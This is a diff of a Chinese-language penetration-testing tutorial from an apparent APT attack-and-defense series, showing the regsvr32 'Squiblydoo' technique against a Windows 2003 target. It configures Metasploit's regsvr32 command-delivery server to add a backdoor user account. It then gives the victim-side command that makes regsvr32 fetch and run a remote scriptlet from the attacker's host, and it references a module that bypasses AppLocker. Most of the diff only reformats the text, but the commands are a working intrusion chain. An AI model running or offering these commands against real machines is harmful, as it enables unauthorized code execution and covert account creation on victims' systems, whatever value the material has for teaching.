@@ -1,25 +1,24 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
-
 **注：**请多喝点热水或者凉白开，身体特别重要。
 
-**Regsvr32简介：**
+### Regsvr32简介：
 
 Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。WinXP及以上系统的regsvr32.exe在windows\system32文件夹下；2000系统的regsvr32.exe在winnt\system32文件夹下。但搭配regsvr32.exe使用的 DLL，需要提供 DllRegisterServer 和 DllUnregisterServer两个输出函式，或者提供DllInstall输出函数。
 
 **说明：**Regsvr32.exe所在路径已被系统添加PATH环境变量中，因此，Regsvr32命令可识别。
 
 Windows 2003 默认位置：
-`C:\WINDOWS\SysWOW64\regsvr32.exe
-C:\WINDOWS\system32\regsvr32.exe`
+```bash
+C:\WINDOWS\SysWOW64\regsvr32.exe
+C:\WINDOWS\system32\regsvr32.exe
+```
 
 
-**攻击机：**192.168.1.4 Debian
-**靶机：** 192.168.1.119 Windows 2003
+**攻击机：**192.168.1.4 Debian  
+**靶机：** 192.168.1.119 Windows 2003  
 
-msf已内置auxiliary版本的regsvr32_command_delivery_server，但是最新版已经无exploit版本regsvr32，文章结尾补充。
+msf 已内置auxiliary版本的regsvr32_command_delivery_server，但是最新版已经无exploit版本regsvr32，文章结尾补充。
 
-**配置攻击机msf：**
+### 配置攻击机msf：
 ```bash
 msf auxiliary(server/regsvr32_command_delivery_server) > use auxiliary/server/regsvr32_command_delivery_server
 msf auxiliary(server/regsvr32_command_delivery_server) > set CMD net user Micropoor Micropoor /add
@@ -35,15 +34,19 @@ regsvr32 /s /n /u /i:http://192.168.1.4:8080/ybn7xESQYCGv scrobj.dll
 ```
 ![](media/415719c964de78a36a9cad8e7d273025.jpg)
 
-**靶机执行：**
-`regsvr32 /s /n /u /i:http://192.168.1.4:8080/ybn7xESQYCGv scrobj.dll`
+### 靶机执行：
+```bash
+regsvr32 /s /n /u /i:http://192.168.1.4:8080/ybn7xESQYCGv scrobj.dll
+```
 ![](media/d6dba86fd41bcac90db86ecc3dc6e7e7.jpg)
 
-![](media/392c2c955e7d666b5015f30149866cf5.jpg)
-![](media/d9c0e792eced1468f86880e42bc28a56.jpg)
+![](media/392c2c955e7d666b5015f30149866cf5.jpg)  
+
+![](media/d9c0e792eced1468f86880e42bc28a56.jpg)  
+
 ![](media/d70caf10069603b0d0bffa73ecbabc29.jpg)
 
-## 附：powershell版Regsvr32
+### 附：powershell 版 Regsvr32
 
 **regsvr32_applocker_bypass_server.rb**
 ```ruby
@@ -144,7 +147,8 @@ end
 
 **使用方法：**
 
-copy regsvr32_applocker_bypass_server.rb to /usr/share/metasploit-framework/modules/exploits/windows/misc
+copy regsvr32_applocker_bypass_server.rb to /usr/share/metasploit-framework/modules/exploits/windows/misc  
+
 ![](media/f0b5c59eb47dd53e8780a31320b41113.jpg)
 
 >   Micropoor
